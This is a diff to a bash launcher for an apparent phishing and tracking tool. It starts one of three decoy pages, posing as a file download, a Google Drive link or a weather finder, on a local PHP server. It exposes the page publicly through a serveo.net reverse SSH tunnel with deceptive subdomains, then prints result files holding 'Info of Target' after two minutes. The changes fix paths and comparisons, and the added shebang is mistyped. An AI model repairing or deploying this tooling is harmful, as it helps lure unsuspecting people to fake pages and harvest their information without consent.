@@ -1,3 +1,5 @@
+#1/bin/bash
+
 Red='\033[0;31m'          # Red
 Green='\033[0;32m'        # Green
 Yellow='\033[0;33m'       # Yellow
@@ -43,7 +45,7 @@ echo "."
 filedownload(){
 
     echo "Starting PHP Server..."
-    cd /Tracker/filedownload
+    cd Tracker/filedownload
     php -S 127.0.0.1:8000
     echo "Starting serveo"
     ssh -R filedownloadersitex:80:127.0.0.1:8000 serveo.net
@@ -59,7 +61,8 @@ gdrive(){
     echo "."
     echo "."
     echo "Starting PHP Server..."
-    cd ../Tracker/gdrive
+    cd ../..
+    cd Tracker/gdrive
     php -S 127.0.0.1:8000
     echo "Starting serveo"
     ssh -R googledrivedownloaderx:80:127.0.0.1:8000 serveo.net
@@ -70,7 +73,7 @@ gdrive(){
 weather(){
 
     echo "Starting PHP Server..."
-    cd /Tracker/weather
+    cd Tracker/weather
     php -S 127.0.0.1:8000
     echo "Starting serveo"
     ssh -R weatherfindersitex:80:127.0.0.1:8000 serveo.net
@@ -81,26 +84,26 @@ weather(){
 resultopen(){
     echo "Sucessfully received Info of Target.."
     echo "Fetching information of Target..."
-    echo /Tracker/filedownload/php/result.txt
-    echo /Tracker/gdrive/php/result.txt
-    echo /Tracker/weather/php/result.txt
+    echo Tracker/filedownload/php/result.txt
+    echo Tracker/gdrive/php/result.txt
+    echo Tracker/weather/php/result.txt
 }
 
-if [ $tempno == 1 ]
+if [ $tempno = 1 ]
 then
     echo "Executing File Downloader Template"
     filedownload
     sleep 2m        #sleeping for 2 minutes
     resultopen      # Open results page after 2 mins
 
-elif [ $tempno == 2 ]
+elif [ $tempno = 2 ]
 then 
     echo "Executing Google Drive Template"
     gdrive
     sleep 2m
     resultopen
 
-elif [ $tempno == 3 ]
+elif [ $tempno = 3 ]
 then
     echo "Executing Weather Template"
     weather
